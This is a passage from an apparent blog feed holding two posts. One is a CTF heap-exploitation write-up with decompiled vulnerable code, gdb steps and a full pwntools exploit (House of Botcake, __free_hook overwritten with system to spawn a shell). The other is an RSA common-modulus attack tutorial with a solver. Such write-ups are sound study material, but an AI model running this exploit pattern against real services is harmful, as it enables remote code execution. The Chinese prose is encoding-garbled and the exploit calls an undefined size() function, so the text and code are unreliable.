class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The index of this note : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The content of this note is : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)note[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No this note, please try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>free<mark></mark></mark></li></ul><p>æ¼æ´ç‚¹ä¹‹äºŒï¼šfreeä¹‹åçš„æŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œå­˜åœ¨uafå’Œdouble free</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">dele</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The index of this note : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)note[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No this note, please try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ul><li>æ¼æ´ç‚¹è¾ƒä¸ºæ˜æ˜¾ï¼Œæ˜¯å¯ä»¥æ‰“House Of Botcakeçš„ï¼Œé•¿åº¦è™½ç„¶æœ‰é™åˆ¶ï¼Œä½†æ˜¯0x80è¶³å¤Ÿè¿›å…¥unsorted binä¸­</li><li>edité•¿åº¦ä¸é™ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ç›¸é‚»chunkçš„fdå’ŒbkæŒ‡é’ˆ</li></ul><h2 id="gdbåŠ¨è°ƒ"><a href="#gdbåŠ¨è°ƒ" class="headerlink" title="gdbåŠ¨è°ƒ"></a>gdbåŠ¨è°ƒ</h2><p><code>1.å¡«æ»¡tcache bin,å¹¶æ³„éœ²libc</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨æ„è¦å…ˆaddå†freeï¼Œä¸ç„¶addå°±æ˜¯å–tcache binä¸­çš„chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112625355.bmp"></p><p>ç›´æ¥showå°±å¯ä»¥è·å¾—__malloc_hook+0x70çš„åœ°å€ï¼Œè¾¾åˆ°æ³„éœ²libc</p><p><code>2.æ‰“House Of Botcake</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bug()</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># tcacheç•™ä¸‹ç©ºä½</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># chunk10</span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># tcahcebin unsortedbin</span></span><br></pre></td></tr></table></figure></div><ul><li>free(7)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112740399.bmp"></p><ul><li>add(0x80)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112807185-1730864904515-24.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112656932.bmp"></p><ul><li>free(8)è¿›å…¥tcacheï¼ˆunsorted binå…ˆè¿›å…ˆå‡º)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112828023.bmp"></p><p><code>3.åˆ©ç”¨editä»»æ„æ”¹+double free</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(__free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,size(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system_addr)) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>æ­¤æ—¶å†æ¬¡addï¼Œæ˜¯å°†tcache binä¸­æœ«å°¾å³ç¬¬ä¸€æ¬¡è¿›å…¥unsorted binä¸­çš„chunkç»™mallocå‡ºæ¥ï¼Œä¿®æ”¹è¯¥chunkçš„fdä¸º__free_hookï¼Œå°±å¯ä»¥addåˆ°free_hookï¼Œç„¶åä¿®æ”¹å…¶æŒ‡å‘çš„åœ°å€</p><ul><li>edit(7,size(payload),payload)ï¼Œä¿®æ”¹tcache bin chunk fd</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017113852230.bmp"></p><ul><li>ç¬¬äºŒæ¬¡addä¹‹å‰ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡addå³å¯å°†__free_hookå½“ä½œfake_chunk</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017113915339.bmp"></p><ul><li>ç¬¬äºŒæ¬¡addï¼Œä¿®æ”¹fdä¸ºsystemï¼Œå³free -&gt; __free_hook-&gt;systemï¼Œæ­¤æ—¶æ‰§è¡Œfree,å³æ‰§è¡Œsystem</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017113934742.bmp"></p><ul><li>æœ€åfree(11),å³system(â€˜&#x2F;bin&#x2F;shâ€™)</li></ul><h2 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=<span class="string">&#x27;gnome-terminal&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;27.25.151.80&quot;,38062)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The size of this note : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The content of this note : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The index of this note : &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The size of this content : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The content of this note : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The index of this note : &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The index of this note : &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;The content of this note is : &quot;</span>)</span><br><span class="line">libc_base=u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># tcahcebin unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(__free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,size(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system_addr)) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…±æ¨¡æ”»å‡»</title>
      <link href="/2024/10/16/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="rsaä¸­çš„å…±æ¨¡æ”»å‡»"><a href="#rsaä¸­çš„å…±æ¨¡æ”»å‡»" class="headerlink" title="rsaä¸­çš„å…±æ¨¡æ”»å‡»"></a>rsaä¸­çš„å…±æ¨¡æ”»å‡»</h1><p><a class="link" href="https://blog.csdn.net/serendipity1130/article/details/120154534">å‚è€ƒæ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>å…±æ¨¡æ”»å‡»æ˜¯æŒ‡åœ¨ä¸åˆ†è§£dçš„æƒ…å†µä¸‹ä¾æ—§å¯ä»¥æ±‚å‡ºmçš„ä¸€ç§ç®—æ³•ï¼Œå¸¸è§ç»™å‡ºäº†c1,c2ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m , e1 , N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m , e2 , N)</span><br></pre></td></tr></table></figure></div><p><mark>è¦æ±‚gcd(e1 , e2)&#x3D;1,å³e1,e2äº’è´¨<mark>,é‚£ä¹ˆåˆ™æœ‰:</mark></mark></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e1*s1 + e2*s2 = <span class="number">1</span></span><br><span class="line">// s1,s2ä¸€æ­£ä¸€è´Ÿ</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥æœ‰:<mark>m &#x3D; ( c1^s1 * c2^s2) % N<mark>ï¼Œä¸‹é¢ç»™å‡ºè¯æ˜ï¼š</mark></mark></p><p><color red>æ³¨æ„ï¼š<color red>æ­¤å¤„å¹¶ä¸æ˜¯è¯´cçš„sæ¬¡æ–¹ï¼Œè€Œæ˜¯cå…³äºNçš„sæ¬¡é€†å…ƒæ˜¯å¤šå°‘ã€‚</color></color></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1 * c2^s2) % N = ( ((m^e1)%N) ^ s1 * (((m^e2)%N) ^ s2)</span><br><span class="line">    // å°†%N å»é™¤ï¼Œå…·ä½“å¯ä»¥çœ‹å¼€å¤´æ–‡ç« </span><br><span class="line">                    = ( m ^ (e1*s1 + e2*s2))%N</span><br><span class="line">                    = m     </span><br></pre></td></tr></table></figure></div><p><mark>æ³¨æ„<mark></mark></mark></p><p>å‡å®šs2ä¸ºè´Ÿæ•°ï¼Œå¹¶ä¸æ˜¯å¯¹c2å¼€æ ¹å·ï¼Œè€Œæ˜¯<code>æ±‚c2çš„é€†å…ƒ</code>ï¼Œäº¤ç»™powå‡½æ•°å³å¯</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">key_size = <span class="number">1024</span></span><br><span class="line">p = getPrime(key_size // <span class="number">2</span>)</span><br><span class="line">q = getPrime(key_size // <span class="number">2</span>)</span><br><span class="line">N = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">message = <span class="string">b&quot;NSSCTF&#123;...............................................&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gcd(m, N) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#N =  80722936701364382749961243326484006977187702986017980842794443374132452156776306032868217795522046975068822236770836452911408536092460646410756678157902792329645719935468879960944028782788489463895870961967670931567205550383999951787250211085264314795753745003815839218062934564501884684565508432346164094171</span></span><br><span class="line"><span class="comment">#e1 = 3</span></span><br><span class="line"><span class="comment">#c1 = 77027474990431732719325428265107176934045610651944725251406683442684093440239073195437770144166442593914418380343458827052860752131667771506129334676070396374008929588455988149871039697387983766750148969695215583137356681988572655848921827794639096404716760310059622671470680330144220097050812716421370445797</span></span><br><span class="line"><span class="comment">#e2 = 7</span></span><br><span class="line"><span class="comment">#c2 = 13491956530007991248882899018888359080930858500993821006822695375714947537976202424265808646466853291165511243721829370428583392329886743499827454177786585477285598196204906977043127274613692623229137936467994670727274820568522666762615055848367486507714640497446688083840123758417442971555904294548595887600</span></span><br></pre></td></tr></table></figure></div><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><ul><li>e1 å’Œ e2 æ˜æ˜¾äº’è´¨ï¼Œå¯ä»¥ç”¨å…±æ¨¡æ”»å‡»ï¼Œå…ˆæ±‚å‡ºs1å’Œs2ï¼Œéšä¾¿é€‰å–ä¸€ä¸ªå³å¯ï¼Œç„¶åç›´æ¥æ±‚å‡ºmå³å¯ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥çš„ RSA å‚æ•°</span></span><br><span class="line">N = <span class="number">80722936701364382749961243326484006977187702986017980842794443374132452156776306032868217795522046975068822236770836452911408536092460646410756678157902792329645719935468879960944028782788489463895870961967670931567205550383999951787250211085264314795753745003815839218062934564501884684565508432346164094171</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">c1 = <span class="number">77027474990431732719325428265107176934045610651944725251406683442684093440239073195437770144166442593914418380343458827052860752131667771506129334676070396374008929588455988149871039697387983766750148969695215583137356681988572655848921827794639096404716760310059622671470680330144220097050812716421370445797</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">c2 = <span class="number">13491956530007991248882899018888359080930858500993821006822695375714947537976202424265808646466853291165511243721829370428583392329886743499827454177786585477285598196204906977043127274613692623229137936467994670727274820568522666762615055848367486507714640497446688083840123758417442971555904294548595887600</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">if</span> e1 * i - e2 * j == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i , j, e1 * i + e2 * j )</span><br><span class="line">s1 = <span class="number">5</span></span><br><span class="line">s2 = -<span class="number">2</span></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s1, N) * <span class="built_in">pow</span>(c2, s2, N)) % N</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="ç‰¹ä¾‹-gcd-e1-e2-1"><a href="#ç‰¹ä¾‹-gcd-e1-e2-1" class="headerlink" title="ç‰¹ä¾‹-gcd(e1,e2) !&#x3D; 1"></a>ç‰¹ä¾‹-gcd(e1,e2) !&#x3D; 1</h1><ul><li>ä¸Šè¿°è¯´äº†ï¼Œå…±æ¨¡æ”»å‡»æ˜¯è¦æ±‚e1å’Œe2äº’è´¨ï¼Œå³(e1,e2)&#x3D;1ï¼Œæ‰æœ‰<code>e1*s1+e2*s2=1</code>,æ‰å¯ä»¥ç»§ç»­è¿›è¡Œåç»­çš„æ“ä½œ</li><li>ä½†æ˜¯è‹¥(e1,e2)!&#x3D;1ï¼Œè€Œæœ‰<code>(e1,e2)=e</code>å‘¢ï¼Ÿæ­¤æ—¶æ˜¯æœ‰<code>e1*s1+e2*s2=e</code>çš„ï¼ŒæŒ‰ç…§ä¸Šè¿°çš„æ¨ç†ï¼Œæˆ‘ä»¬å¾—åˆ°çš„åº”è¯¥æ˜¯</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1 * c2^s2) % N = (m ^ e)%N</span><br></pre></td></tr></table></figure></div><p>åˆ†ä¸¤ç§æƒ…å†µï¼š</p><p><code>1: m^e &lt; N:</code> é‚£ä¹ˆæ­¤æ—¶ç›´æ¥å¼€eæ¬¡æ ¹å³å¯</p><p><code>2: m^e &gt; N:</code>æ­¤æ—¶ç›´æ¥å¼€æ ¹ç­”æ¡ˆå¹¶ä¸å¯¹</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M = (c1^s1 * c2^s2) % N = (m ^ e)%N</span><br><span class="line">-&gt; m^e = k*n + M (k=<span class="number">1</span>,<span class="number">2</span>,.....)</span><br></pre></td></tr></table></figure></div><h2 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e1*e2= <span class="number">59653</span></span><br><span class="line">n= <span 